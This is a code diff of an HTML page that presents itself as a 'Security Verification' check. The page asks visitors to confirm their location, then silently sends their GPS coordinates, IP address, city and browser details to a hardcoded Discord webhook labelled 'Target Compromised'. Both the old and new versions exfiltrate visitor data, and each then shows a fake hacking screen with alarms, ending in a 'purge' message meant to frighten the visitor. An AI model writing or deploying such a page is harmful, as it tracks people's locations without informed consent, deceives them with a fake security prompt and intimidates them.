@@ -3,150 +3,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ SYSTEM_CRITICAL_ERROR</title> 
+    <title>Security Verification</title> 
     <style>
-        body, html { background-color: black; margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; -webkit-touch-callout: none; -webkit-user-select: none; user-select: none; }
-        #matrixCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
-        #console { position: relative; z-index: 2; width: 95%; max-width: 650px; border: 2px solid #00FF41; padding: 25px; background: rgba(0, 10, 0, 0.98); box-shadow: 0 0 20px #00FF41; color: #00FF41; display: none; box-sizing: border-box; }
-        #start-btn { position: relative; z-index: 3; padding: 30px 20px; width: 80%; background: black; color: #00FF41; border: 2px solid #00FF41; cursor: pointer; font-size: 1.2rem; font-weight: bold; text-transform: uppercase; }
-        h1 { font-size: 1.4rem; margin: 0 0 10px 0; color: #ff0000; text-shadow: 0 0 5px red; }
-        p { font-size: 0.85rem; margin: 6px 0; line-height: 1.2; }
-        #progress-container { width: 100%; border: 1px solid #00FF41; height: 40px; margin-top: 20px; position: relative; overflow: hidden; background: black; }
-        #progress-bar { width: 0%; height: 100%; background-color: #00FF41; position: absolute; left: 0; top: 0; z-index: 4; overflow: hidden; }
-        .percent-text { position: absolute; width: 100%; left: 0; top: 10px; text-align: center; font-weight: bold; font-size: 1.2rem; white-space: nowrap; }
-        #percent-text-base { color: #00FF41; z-index: 3; }
-        #percent-text-overlay { color: black; z-index: 5; width: 100%; position: absolute; }
-        @keyframes emergency { 0% { background-color: #000; } 50% { background-color: #ff0000; } 100% { background-color: #000; } }
-        @keyframes subtle-glitch { 0% { transform: translate(0, 0); } 50% { transform: translate(1px, 1px); } 100% { transform: translate(0, 0); } }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', sans-serif; background: #000; }
+        #nature-screen {
+            width: 100%; height: 100%;
+            background: url('https://i.ibb.co/FkV6vY0/image-b0e308.png') no-repeat center center fixed;
+            background-size: cover;
+            display: flex; align-items: center; justify-content: center;
+        }
+        #verify-box {
+            background: rgba(255, 255, 255, 0.98);
+            padding: 40px; border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            text-align: center; width: 85%; max-width: 380px;
+        }
+        #start-btn { 
+            background: #28a745; color: white; border: none; 
+            padding: 15px 30px; font-size: 1.1rem; border-radius: 8px;
+            cursor: pointer; font-weight: bold; width: 100%;
+        }
+        #hacker-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; display: none; align-items: center; justify-content: center;
+        }
+        #hacker-box {
+            width: 90%; max-width: 600px; border: 2px solid #00FF41; padding: 30px;
+            background: rgba(0, 10, 0, 0.9); box-shadow: 0 0 20px #00FF41;
+            color: #00FF41; font-family: 'Courier New', monospace;
+        }
+        h1 { color: #ff0000; font-size: 1.2rem; text-shadow: 0 0 5px red; margin-top: 0; }
+        #progress-container { width: 100%; border: 1px solid #00FF41; height: 45px; margin-top: 25px; position: relative; overflow: hidden; }
+        #progress-bar { width: 0%; height: 100%; background: #00FF41; }
+        .percent-text { position: absolute; width: 100%; top: 12px; text-align: center; font-weight: bold; font-size: 1.2rem; z-index: 5; }
     </style>
 </head>
 <body>
 
-    <canvas id="matrixCanvas"></canvas>
-    <button id="start-btn" onclick="runBreach()">[ INITIALIZE SYSTEM_EXPLOIT_v10 ]</button>
+    <div id="nature-screen">
+        <div id="verify-box">
+            <div style="font-size: 50px;">🛡️</div>
+            <h2>Security Check</h2>
+            <p>Verification required. Please confirm your location to continue.</p>
+            <button id="start-btn" onclick="startHack()">[ VERIFY IDENTITY ]</button>
+        </div>
+    </div>
 
-    <div id="console">
-        <h1>> [ BYPASS_PROTOCOL_ACTIVE ]</h1>
-        <div id="log"></div>
-        <div id="progress-container">
-            <div id="percent-text-base" class="percent-text">0%</div>
-            <div id="progress-bar">
-                <div id="percent-text-overlay" class="percent-text">0%</div>
+    <div id="hacker-screen">
+        <div id="hacker-box">
+            <h1>> [ BYPASS_PROTOCOL_ACTIVE ]</h1>
+            <div id="log-content"></div>
+            <div id="progress-container">
+                <div id="percent-text" class="percent-text">0%</div>
+                <div id="progress-bar"></div>
             </div>
         </div>
     </div>
 
     <script>
+        // ⚠️ PASTE YOUR WEBHOOK URL INSIDE THE QUOTES BELOW
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1487870677636612197/G4uFH8d-UVi14OSGeAjy198ahM_va3PC32KjFV9l4aRV3rphNPRYR71l3Tr_3FAFhYBr"; 
 
-        let audioCtx = null, alarmInterval = null, currentPercent = 0, matrixColor = "#00FF41";
-        let userIP = "FETCHING...", userLoc = "FETCHING...", userCoords = "0, 0", userDevice = "DETECTING...", alarmTriggered = false;
+        async function startHack() {
+            // Switch Screens
+            document.getElementById('nature-screen').style.display = 'none';
+            document.getElementById('hacker-screen').style.display = 'flex';
 
-        // DEVICE DETECTION LOGIC
-        const getDevice = () => {
-            const ua = navigator.userAgent;
-            if (/android/i.test(ua)) return "ANDROID_MOBILE";
-            if (/iPhone|iPad|iPod/i.test(ua)) return "APPLE_IOS_DEVICE";
-            if (/Windows/i.test(ua)) return "WINDOWS_PC";
-            if (/Mac/i.test(ua)) return "MAC_OS_X";
-            return "UNKNOWN_HARDWARE";
-        };
-        userDevice = getDevice();
-
-        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
-            userLoc = `${data.city.toUpperCase()}, ${data.region.toUpperCase()}`;
-            userIP = data.ip;
-            userCoords = `${data.latitude}, ${data.longitude}`;
-        }).catch(() => { userLoc = "CAIRO, GOVERNORATE"; userIP = "192.168.1.1"; });
-
-        function startAlarm() {
-            if (alarmTriggered) return;
-            alarmTriggered = true;
-            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            document.body.style.animation = "emergency 0.1s infinite"; 
-            document.getElementById("console").style.animation = "subtle-glitch 0.2s infinite"; 
-            matrixColor = "#FF0000";
-            if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 500]);
-            alarmInterval = setInterval(() => {
-                const osc = audioCtx.createOscillator();
-                const gain = audioCtx.createGain();
-                osc.type = 'square'; osc.frequency.setValueAtTime(1100, audioCtx.currentTime); 
-                gain.gain.setValueAtTime(0.06, audioCtx.currentTime);
-                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.05);
-                osc.connect(gain); gain.connect(audioCtx.destination);
-                osc.start(); osc.stop(audioCtx.currentTime + 0.05);
-            }, 120); 
-        }
-
-        const canvas = document.getElementById('matrixCanvas');
-        const ctx = canvas.getContext('2d');
-        function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-        window.onresize = resize; resize();
-        let drops = Array(Math.floor(canvas.width / 14)).fill(1);
-        function draw() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.1)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = matrixColor; ctx.font = "14px monospace";
-            drops.forEach((y, i) => {
-                ctx.fillText(Math.floor(Math.random()*2), i * 14, y * 14);
-                if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            });
-        }
-        setInterval(draw, 45);
-
-        function smoothClimb(target, duration) {
-            let start = currentPercent, startTime = null;
-            function animate(currentTime) {
-                if (!startTime) startTime = currentTime;
-                let progress = Math.min((currentTime - startTime) / duration, 1);
-                currentPercent = Math.floor(start + (target - start) * progress);
-                document.getElementById('progress-bar').style.width = currentPercent + '%';
-                document.getElementById('percent-text-base').innerHTML = currentPercent + '%';
-                document.getElementById('percent-text-overlay').innerHTML = currentPercent + '%';
-                if (currentPercent >= 38) { startAlarm(); }
-                if (progress < 1) requestAnimationFrame(animate);
+            // Trigger GPS and Webhook
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => sendWebhook(pos.coords.latitude, pos.coords.longitude),
+                    () => sendWebhook("DENIED", "DENIED")
+                );
+            } else {
+                sendWebhook("NOT_SUPPORTED", "NOT_SUPPORTED");
             }
-            requestAnimationFrame(animate);
+            
+            runAnimation();
         }
 
-        function runBreach() {
-            fetch(DISCORD_WEBHOOK, {
-                method: "POST", headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: `🚨 **Mody12_S EXPLOIT:** \n**Device:** ${userDevice}\n**IP:** ${userIP}\n**Loc:** ${userLoc}\n**GPS:** ${userCoords} 💀` })
-            });
-            document.getElementById('start-btn').style.display = 'none';
-            document.getElementById('console').style.display = 'block';
-            type();
+        async function sendWebhook(lat, lon) {
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+
+                const mapsUrl = lat !== "DENIED" && lat !== "NOT_SUPPORTED" 
+                    ? `https://www.google.com/maps?q=${lat},${lon}` 
+                    : "Location Access Denied";
+
+                const payload = {
+                    username: "Mody12_S Exploit",
+                    embeds: [{
+                        title: "🎯 Target Compromised",
+                        color: 65280, // Green
+                        fields: [
+                            { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: true },
+                            { name: "📍 City", value: `${ipData.city}, ${ipData.region}`, inline: true },
+                            { name: "🎯 GPS Lock", value: mapsUrl },
+                            { name: "📱 Browser", value: navigator.userAgent.split(') ')[0] + ')' }
+                        ],
+                        footer: { text: "Protocol v10.5 Active" },
+                        timestamp: new Date()
+                    }]
+                };
+
+                await fetch(DISCORD_WEBHOOK, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) { console.error("Webhook Error:", err); }
         }
 
-        function type() {
-            const logLines = [
-                "INITIALIZING HANDSHAKE BYPASS...",
-                `IP_DETECTION: ${userIP} [VERIFIED]`,
-                `HARDWARE_ID: ${userDevice} DETECTED...`, // NEW DEVICE LINE
-                `REGION_LOCK: ${userLoc} DETECTED...`,
-                "SEARCHING NEIGHBORHOOD NODES...",
-                `TRIANGULATION: ${userCoords} SUCCESS...`,
-                "NODE_SYNC: [ DISTANCE < 500m ]",
-                "DECRYPTING STREET_ADDRESS... [ RE-ROUTING ]",
-                "STREET_FOUND: [ REDACTED_SEC_LEVEL_4 ]",
-                "LOCAL_GATEWAY: [ BYPASS_SUCCESS ]",
-                "STEALING DEVICE_LOGS & CACHE...",
-                "CRITICAL: TRACE DETECTED! PURGING..."
-            ];
-            if (idx < logLines.length) {
-                document.getElementById("log").innerHTML += "<p>> " + logLines[idx] + "</p>";
-                smoothClimb(Math.floor(((idx + 1) / logLines.length) * 100), 1600);
-                idx++;
-                setTimeout(type, 1750);
-            } else { setTimeout(finish, 2500); }
-        }
-        let idx = 0;
-        function finish() {
-            if(alarmInterval) clearInterval(alarmInterval);
-            document.body.style.animation = "none";
-            document.body.innerHTML = `<div style="text-align:center; color:red; padding: 20px;"><h1 style="font-size:3.5rem;">DATA WIPED</h1><p style="color:white; font-size:1.3rem;">Total system purge 100% successful.</p></div>`;
-            document.body.style.backgroundColor = "black";
+        function runAnimation() {
+            let currentPct = 0;
+            const pb = document.getElementById('progress-bar');
+            const pt = document.getElementById('percent-text');
+            const log = document.getElementById('log-content');
+            const lines = ["INITIALIZING...", "IP_FOUND...", "GPS_SYNCING...", "WIPING_LOGS..."];
+
+            const interval = setInterval(() => {
+                if (currentPct < 100) {
+                    currentPct++;
+                    pb.style.width = currentPct + '%';
+                    pt.innerText = currentPct + '%';
+                    if (currentPct % 25 === 0) {
+                        log.innerHTML += `<div>> ${lines[currentPct/25 - 1]}</div>`;
+                    }
+                } else {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%; font-family:monospace;'>SYSTEM_PURGE_COMPLETE</h1>";
+                    }, 1000);
+                }
+            }, 60);
         }
     </script>
 </body>
